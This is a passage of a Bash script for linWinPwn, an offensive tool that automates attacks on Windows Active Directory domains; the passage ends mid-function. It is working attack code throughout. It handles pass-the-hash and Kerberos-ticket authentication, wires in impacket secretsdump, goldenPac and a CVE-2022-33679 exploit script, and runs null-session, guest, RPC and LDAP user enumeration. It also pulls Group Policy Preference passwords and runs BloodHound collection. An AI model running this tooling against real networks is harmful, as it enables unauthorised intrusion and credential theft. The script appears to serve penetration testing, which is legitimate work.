#!/bin/bash
# Title: linWinPwn
# Author: lefayjey

#Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

#Default variables
user=""
password=""
modules="interactive"
output_dir="$(pwd)"
wordlists_dir="/opt/lwp-wordlists"
pass_list="/usr/share/wordlists/rockyou.txt"
if [ ! -f "${pass_list}" ]; then pass_list="${wordlists_dir}/rockyou.txt"; fi
users_list="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
if [ ! -f "${users_list}" ]; then users_list="${wordlists_dir}/cirt-default-usernames.txt"; fi
curr_targets="Domain Controllers"
custom_target_scanned=false
nullsess_bool=false
pass_bool=false
hash_bool=false
kerb_bool=false
autoconfig_bool=false
ldaps_bool=false
forcekerb_bool=false
verbose_bool=false

#Tools variables
scripts_dir="/opt/lwp-scripts"
crackmapexec=$(which crackmapexec)
impacket_findDelegation=$(which findDelegation.py)
if [ ! -f "${impacket_findDelegation}" ]; then impacket_findDelegation=$(which impacket-findDelegation); fi
impacket_GetUserSPNs=$(which GetUserSPNs.py)
if [ ! -f "${impacket_GetUserSPNs}" ]; then impacket_GetUserSPNs=$(which impacket-GetUserSPNs); fi
impacket_secretsdump=$(which secretsdump.py)
if [ ! -f "${impacket_secretsdump}" ]; then impacket_secretsdump=$(which impacket-secretsdump); fi
impacket_GetNPUsers=$(which GetNPUsers.py)
if [ ! -f "${impacket_GetNPUsers}" ]; then impacket_GetNPUsers=$(which impacket-GetNPUsers); fi
impacket_getTGT=$(which getTGT.py)
if [ ! -f "${impacket_getTGT}" ]; then impacket_getTGT=$(which impacket-getTGT); fi
impacket_goldenPac=$(which goldenPac.py)
if [ ! -f "${impacket_goldenPac}" ]; then impacket_goldenPac=$(which impacket-goldenPac); fi
enum4linux_py=$(which enum4linux-ng)
if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
bloodhound=$(which bloodhound-python)
ldapdomaindump=$(which ldapdomaindump)
smbmap=$(which smbmap)
adidnsdump=$(which adidnsdump)
certi_py=$(which certi.py)
certipy=$(which certipy)
ldeep=$(which ldeep)
pre2k=$(which pre2k)
certsync=$(which certsync)
hekatomb=$(which hekatomb)
donpapi="$scripts_dir/DonPAPI-main/DonPAPI.py"
kerbrute="$scripts_dir/kerbrute"
silenthound="$scripts_dir/silenthound.py"
windapsearch="$scripts_dir/windapsearch"
CVE202233679="$scripts_dir/CVE-2022-33679.py"
targetedKerberoast="$scripts_dir/targetedKerberoast.py"
nmap=$(which nmap)
john=$(which john)

print_banner () {
    echo -e "
       _        __        ___       ____                  
      | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __   
      | || | '_  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \  
      | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
      |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 

      ${BLUE}linWinPwn: ${CYAN}version 0.7.7 ${NC}
      https://github.com/lefayjey/linWinPwn
      ${BLUE}Author: ${CYAN}lefayjey${NC}
      ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
"
}

help_linWinPwn () {
    print_banner
    echo -e "${YELLOW}Parameters${NC}"
    echo -e "-h/--help         Show the help message"
    echo -e "-t/--target       DC IP or target Domain ${RED}[MANDATORY]${NC}"
    echo -e "-u/--username     Username (default: empty)"
    echo -e "-p/-H/-K          Password or LM:NT Hash or location to Kerberos ticket './krb5cc_ticket' (default: empty)" 
    echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
    echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
    echo -e "-o/--output       Output directory (default: current dir)"
    echo -e "--auto-config     Run NTP sync with target DC and adds entry to /etc/hosts"
    echo -e "--ldaps           Use LDAPS instead of LDAP (port 636)"
    echo -e "--force-kerb      Use Kerberos authentication instead of NTLM (requires password or NTLM hash)"
    echo -e "--verbose         Enable all verbose and debug outputs"
    echo -e ""
    echo -e "${YELLOW}Example usages${NC}"
    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain -d domain -u user [-p password or -H hash or -k kerbticket]" >&2;
    echo -e ""
}

args=()
while test $# -gt 0; do
        case $1 in
            -d) domain="${2}"; shift;;
            --domain) domain="${2}"; shift;;
            -u) user="${2}"; shift;; #leave empty for anonymous login
            --user) user="${2}"; shift;; #leave empty for anonymous login
            -p) password="${2}"; pass_bool=true; shift;; #password
            -H) hash="${2}"; hash_bool=true; shift;; #NTLM hash
            -K) krb5cc="${2}"; kerb_bool=true; shift;; #location of krb5cc ticket
            -t) dc_ip="${2}"; shift;; #mandatory
            --target) dc_ip="${2}"; shift;; #mandatory
            -M) modules="${2}"; shift;; #comma separated modules to run
            --Modules) modules="${2}"; shift;; #comma separated modules to run
            -o) output_dir="$(realpath ${2})"; shift;;
            --output) output_dir="$(realpath ${2})"; shift;;
            --auto-config) autoconfig_bool=true; args+=($1);;
            --ldaps) ldaps_bool=true; args+=($1);;
            --force-kerb) forcekerb_bool=true; args+=($1);;
            --verbose) verbose_bool=true; args+=($1);;
            -h) help_linWinPwn; exit;;
            --help) help_linWinPwn; exit;;
            *) print_banner; echo -e "${RED}[-] Unknown option:${NC} ${1}"; echo -e "Use -h for help"; exit 1;;
        esac
        shift
done
set -- "${args[@]}"

prepare (){
    if [ -z "$dc_ip" ] ; then
        echo -e "${RED}[-] Missing target... ${NC}"
        echo -e "Use -h for help"
        exit 1
    fi

    echo -e "${GREEN}[+] $(date)${NC}"

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${RED}[-] Please ensure crackmapexec is installed and try again... ${NC}"
        exit 1
    else
        dc_info=$(${crackmapexec} smb ${dc_ip})
    fi

    dc_NETBIOS=$(echo $dc_info| cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
    dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)

    if [ -z "$dc_domain" ] ; then
        echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}"
        exit 1
    elif [ "$dc_domain" == "$dc_ip" ] && [ -z "$domain" ]; then
        echo -e "${RED}[-] Error finding DC's domain, please specify domain... ${NC}"
        exit 1
    else 
        if [ -z "$domain" ]; then domain=$dc_domain; else dc_domain=$domain; fi
    fi

    dc_FQDN=${dc_NETBIOS}"."${dc_domain}
    kdc=""
    dc_open_ports=$(${nmap} -p 135,445,389,636 ${dc_ip} -sT -T5 --open)
    if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
    if [[ $dc_open_ports == *"636/tcp"* ]]; then dc_port_636="${GREEN}open${NC}"; else dc_port_636="${RED}filtered|closed${NC}"; fi

    if [ "${autoconfig_bool}" == true ]; then
        echo -e "${BLUE}[*] NTP and /etc/hosts auto-config... ${NC}"
        sudo timedatectl set-ntp 0
        sudo ntpdate ${dc_ip}
        if [[ ! $(grep ${dc_ip} "/etc/hosts") ]]; then
            echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
            echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
        else
            echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
        fi
    fi

    if [ "${user}" == "" ]; then user_out="null"; else user_out=${user}; fi
    output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"
    servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
    dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
    sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
    custom_servers_list="${output_dir}/DomainRecon/custom_servers_list_${dc_domain}.txt"
    dc_hostname_list="${output_dir}/DomainRecon/servers_list_dc_${dc_domain}.txt"
    sql_hostname_list="${output_dir}/DomainRecon/servers_list_sql_${dc_domain}.txt"
    dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"
    target=${dc_ip}
    target_dc=${dc_ip_list}
    target_sql=${sql_ip_list}

    mkdir -p ${output_dir}/Scans
    mkdir -p ${output_dir}/DomainRecon/BloodHound
    mkdir -p ${output_dir}/DomainRecon/LDAPDomainDump
    mkdir -p ${output_dir}/DomainRecon/ADCS
    mkdir -p ${output_dir}/DomainRecon/SilentHound
    mkdir -p ${output_dir}/DomainRecon/ldeepDump
    mkdir -p ${output_dir}/Kerberos
    mkdir -p ${output_dir}/Shares/SharesDump
    mkdir -p ${output_dir}/Credentials
    mkdir -p ${output_dir}/Vulnerabilities
    mkdir -p /tmp/shared

    if [ ! -f "${users_list}" ] ; then
        echo -e "${RED}[-] Users list file not found${NC}"
    fi

    if [ ! -f "${pass_list}" ] ; then
        echo -e "${RED}[-] Passwords list file not found${NC}"
    fi

    #Check if null session is used
    if [ "${user}" == "" ] && [ "${pass_bool}" == false ] && [ "${hash_bool}" == false ] && [ "${kerb_bool}" == false ] ; then
        nullsess_bool=true
        argument_cme=("-u" "" "-p" "")
        argument_imp="${domain}/"
        argument_imp_gp="${domain}/"
        argument_smbmap=""
        argument_ldeep="-d ${dc_domain} -a"
        argument_pre2k="-d ${domain}"
        auth_string="${YELLOW}[i]${NC} Authentication method: null session ${NC}"
    
    #Check if username is not provided
    elif [ "${user}" == "" ]; then
        echo -e "${RED}[i]${NC} Please specify username and try again..."
        exit 1
    
    #Check if empty password is used
    elif [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] ; then
        argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "")
        argument_imp="${domain}/${user}:''" 
        argument_imp_gp="${domain}/${user}:''" 
        argument_bhd="-u ${user}@${domain} -p ''"
        argument_enum4linux="-w ${domain} -u ${user} -p ''"
        argument_adidns="-u ${domain}\\${user} -p ''"
        argument_ldd="-u ${domain}\\${user} -p ''"
        argument_smbmap="-d ${domain} -u ${user} -p ''"
        argument_certi_py="${domain}/${user}:''"
        argument_certipy="-u ${user}@${domain} -p ''"
        argument_ldeep="-d ${domain} -u ${user} -p '' -a"
        argument_pre2k="-d ${domain} -u ${user} -p ''"
        argument_certsync="-d ${domain} -u ${user} -p ''"
        argument_donpapi="${domain}/${user}:''"
        argument_hekatomb="${domain}/${user}:''"
        argument_silenthd="-u ${domain}\\${user} -p ''"
        argument_windap="-d ${domain} -u ${user} -p ''"
        argument_targkerb="-d ${domain} -u ${user} -p ''"
        pass_bool=false
        hash_bool=false
        kerb_bool=false
        auth_string="${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
    
    #Check if multiple credentials provided
    elif ([ "${pass_bool}" == true ] && [ "${hash_bool}" == true ]) || ([ "${pass_bool}" == true ] && [ "${kerb_bool}" == true ]) || ([ "${hash_bool}" == true ] && [ "${kerb_bool}" == true ]) || ([ "${forcekerb_bool}" == true ] && [ "${kerb_bool}" == true ])  ; then
        echo -e "${RED}[i]${NC} Please choose between either -p [--force-kerb], -H [--force-kerb] or -K ..."
        exit 1
    
    fi

    if [ "${pass_bool}" == true ] ; then
        argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "${password}")
        argument_imp="${domain}/${user}:${password}"
        argument_imp_gp="${domain}/${user}:${password}"
        argument_bhd="-u ${user}@${domain} -p ${password}"
        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
        argument_adidns="-u ${domain}\\${user} -p ${password}"
        argument_ldd="-u ${domain}\\${user} -p ${password}"
        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
        argument_certi_py="${domain}/${user}:${password}"
        argument_certipy="-u ${user}@${domain} -p ${password}"
        argument_ldeep="-d ${domain} -u ${user} -p ${password}"
        argument_pre2k="-d ${domain} -u ${user} -p ${password}"
        argument_certsync="-d ${domain} -u ${user} -p ${password}"
        argument_donpapi="${domain}/${user}:${password}"
        argument_hekatomb="${domain}/${user}:${password}"
        argument_silenthd="-u ${domain}\\${user} -p ${password}"
        argument_windap="-d ${domain} -u ${user} -p ${password}"
        argument_targkerb="-d ${domain} -u ${user} -p ${password}"
        auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
    fi

    #Check if NTLM hash is used, and complete with empty LM hash
    if [ "${hash_bool}" == true ] ; then
        if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
            if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
                hash="aad3b435b51404eeaad3b435b51404ee"$hash
            fi
            argument_cme=("-d" "${domain}" "-u" "${user}" "-H" "${hash}")
            argument_imp=" -hashes ${hash} ${domain}/${user}"
            argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
            argument_bhd="-u ${user}@${domain} --hashes ${hash}"
            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 1 32)"
            argument_adidns="-u ${domain}\\${user} -p ${hash}"
            argument_ldd="-u ${domain}\\${user} -p ${hash}"
            argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
            argument_certi_py="${domain}/${user} --hashes ${hash}"
            argument_certipy="-u ${user}@${domain} -hashes ${hash}"
            argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
            argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
            argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
            argument_donpapi=" -H ${hash} ${domain}/${user}"
            argument_hekatomb="-hashes ${hash} ${domain}/${user}"
            argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
            argument_windap="-d ${domain} -u ${user} --hash ${hash}"
            argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
            auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
        else
            echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
            exit 1
        fi
    fi
    
    #Check if kerberos ticket is used
    if [ "${kerb_bool}" == true ] || [ "${forcekerb_bool}" == true ] ; then

        if [ "${kerb_bool}" == true ] ; then
            argument_cme=("-d" "${domain}" "-u" "${user}" "--use-kcache")
            target_dc=${dc_hostname_list}
        fi
        if [ "${forcekerb_bool}" == true ] ; then
            argument_cme=("${argument_cme[@]}" "-k")
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            echo -e ""
            echo -e "${YELLOW}[i]${NC} Requesting TGT for current user..."
            ${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip} | grep -v "Impacket" | sed '/^$/d'
            cd ${current_dir}
            krb5cc="${output_dir}/Credentials/${user}.ccache"
        fi

        if [ -f "${krb5cc}" ] ; then
            target=${dc_FQDN}
            target_sql=${sql_hostname_list}
            export KRB5CCNAME=$(realpath $krb5cc)
            argument_imp="-k -no-pass ${domain}/${user}"
            argument_enum4linux="-w ${domain} -u ${user} -K ${krb5cc}"
            argument_bhd="-u ${user}@${domain} -k -no-pass -p ''"
            argument_certi_py="${domain}/${user} -k --no-pass"
            argument_certipy="-u ${user}@${domain} -k -no-pass -target ${dc_FQDN}"
            argument_ldeep="-d ${domain} -u ${user} -k"
            argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
            argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass"
            argument_donpapi="-k -no-pass ${domain}/${user}"
            argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
            kdc="$(echo $dc_FQDN | cut -d '.' -f 1)"
            auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $krb5cc)"
        else
            echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath $krb5cc)..."
            exit 1
        fi
    fi

    if [ "${nullsess_bool}" == false ] ; then
        auth_check=$(${crackmapexec} smb ${target} "${argument_cme[@]}" 2>&1| grep "\[-\]\|Traceback" -A 10)
        if [ ! -z "$auth_check" ] ; then
            echo $auth_check
            echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
            exit 1
        fi
    fi

    if [ "${verbose_bool}" == true ] ; then
        cme_verbose="--verbose"
        argument_imp="-debug ${argument_imp}"
        argument_imp_gp="-debug ${argument_imp_gp}"
        argument_enum4linux="${argument_enum4linux} -v"
        argument_bhd="${argument_bhd} -v"
        argument_adidns="${argument_adidns} -v -d"
        argument_pre2k="${argument_pre2k} -verbose"
        argument_certsync="${argument_certsync} -debug"
        argument_donpapi="-d ${argument_donpapi}"
        argument_hekatomb="-debug ${argument_hekatomb}"
        argument_windap="${argument_windap} -v --debug"
        argument_targkerb="${argument_targkerb} -v"
        argument_kerbrute="-v"
        argument_CVE202233679="-debug"
    fi
    echo -e ""
}

dns_enum () {
    if [ ! -f "${adidnsdump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
        if [ ! -f "${dns_records}" ]; then
            if [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
            else
                if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                ${adidnsdump} ${argument_adidns} ${ldaps_param} --dns-tcp ${dc_ip} | tee ${output_dir}/DomainRecon/adidnsdump_output_${dc_domain}.txt
                mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 > ${servers_ip_list}
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 > ${dc_ip_list}
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 > ${dc_hostname_list}
            fi
        else
            echo -e "${YELLOW}[i] DNS dump found ${NC}"
        fi
    fi

    if [ ! -f ${servers_ip_list} ]; then /bin/touch ${servers_ip_list}; fi
    if [ ! $(grep ${dc_ip} ${servers_ip_list}) ]; then echo ${dc_ip} >> ${servers_ip_list}; fi
    if [ ! -f ${dc_ip_list} ]; then /bin/touch ${dc_ip_list}; fi
    if [ ! $(grep ${dc_ip} ${dc_ip_list}) ]; then echo ${dc_ip} >> ${dc_ip_list}; fi
    if [ ! -f ${dc_hostname_list} ]; then /bin/touch  ${dc_hostname_list}; fi
    if [ ! $(grep ${dc_FQDN} ${dc_hostname_list}) ]; then echo ${dc_FQDN} >> ${dc_hostname_list}; fi
    echo -e ""
}

smb_scan () {
    if [ ! -f "${nmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
    else
        if [ "${curr_targets}" == "Domain Controllers" ] ; then
            servers_smb_list=${target_dc}
        elif  [ "${curr_targets}" == "All domain servers" ] ; then
            servers_scan_list=${servers_ip_list}
            echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
            servers_smb_list="${output_dir}/Scans/servers_all_smb_${dc_domain}.txt"
            if [ ! -f "${servers_smb_list}" ]; then
                ${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        elif  [ "${curr_targets}" == "File containing list of servers" ] ; then
            servers_scan_list=${custom_servers_list}
            echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
            if [ "${custom_target_scanned}" == false ]; then
                ${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
                custom_target_scanned=true
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        elif  [ "${curr_targets}" == "IP or hostname" ] ; then
            servers_scan_list=$(head -n1 ${custom_servers_list})
            echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
            if [ "${custom_target_scanned}" == false ]; then
                ${nmap} -p 445 -Pn -sT -n ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
                custom_target_scanned=true
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        fi
    fi
}

###### AD Enumeration
bhd_enum () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ | grep -v 'bloodhound_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] BloodHound results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/BloodHound
                ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt
                cd ${current_dir}
            fi
        fi
    fi
    echo -e ""
}

bhd_enum_dconly () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        echo -e "${BLUE}[*] BloodHound Enumeration using DCOnly${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ | grep -v 'bloodhound_output' 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] BloodHound results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
            else 
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/BloodHound
                ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt
                cd ${current_dir}
            fi
        fi
    fi
    echo -e ""
}

enum4linux_enum () {
    if [ ! -f "${enum4linux_py}" ] ; then
        echo -e "${RED}[-] Please verify the installation of enum4linux-ng${NC}"
    else
        echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${CYAN}[*] Empty username/password${NC}"
            ${enum4linux_py} -A ${target} 2>&1 > ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt
            head -n 20 ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt 2>&1
            echo -e "............................(truncated output)"
            #Parsing user lists
            /bin/cat ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_nullsess_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[*] Guest with empty password${NC}"
            ${enum4linux_py} -A ${target} -u 'Guest' -p '' > ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
            head -n 20 ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
            echo -e "............................(truncated output)"            #Parsing user lists
            /bin/cat ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_guest_${dc_domain}.txt 2>&1
        else
            ${enum4linux_py} -A ${argument_enum4linux} ${target} > ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
            head -n 20 ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
            echo -e "............................(truncated output)"            #Parsing user lists
            /bin/cat ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_${dc_domain}.txt 2>&1
        fi
    fi
    echo -e ""
}

cme_rpc_enum () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${BLUE}[*] Users Enumeration (RPC Null session)${NC}"
        ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --users > ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt 2>/dev/null | grep -a "${dc_domain}" | grep -a -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_cme_smb_nullsess_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/users_list_cme_smb_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
    else
        echo -e "${BLUE}[*] Users Enumeration (RPC authenticated)${NC}"
        ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --users > ${output_dir}/DomainRecon/cme_users_auth_smb_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/cme_users_auth_smb_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2};?)?)?[mGK]//g" | sed  -e 's/ \{2,\}/ /g' | cut -d " " -f 5 | cut -d "\\" -f 2 > ${output_dir}/DomainRecon/users_list_cme_smb_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/users_list_cme_smb_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum${NC}"
    fi
    echo -e ""
    echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
    ${crackmapexec} ${cme_verbose} smb ${target} "${argument_cme[@]}" --pass-pol 2>&1 | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
    echo -e ""
    echo -e "${BLUE}[*] GPP Enumeration${NC}"
    ${crackmapexec} ${cme_verbose} smb ${target_dc} "${argument_cme[@]}" -M gpp_autologin 2>&1 | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
    ${crackmapexec} ${cme_verbose} smb ${target_dc} "${argument_cme[@]}" -M gpp_password 2>&1 | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
    echo -e ""
}

cme_ldap_enum () {
    if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${BLUE}[*] Users Enumeration (LDAP Null session)${NC}"
        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} --users --kdcHost "${kdc}.${dc_domain}" > ${output_dir}/DomainRecon/cme_users_nullsess_ldap_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/cme_users_nullsess_ldap_${dc_domain}.txt 2>/dev/null | grep -a "${dc_domain}" | grep -a -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_cme_ldap_nullsess_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/users_list_cme_ldap_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using LDAP User Enum${NC}"
    else
        echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" ${ldaps_param} --users --kdcHost "${kdc}.${dc_domain}" > ${output_dir}/DomainRecon/cme_users_auth_ldap_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/cme_users_auth_ldap_${dc_domain}.txt 2>/dev/null | grep -v "\[-\|\[+\|\[\*" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2};?)?)?[mGK]//g" | sed  -e 's/ \{2,\}/ /g' | cut -d " " -f 5 > ${output_dir}/DomainRecon/users_list_cme_ldap_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/users_list_cme_ldap_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
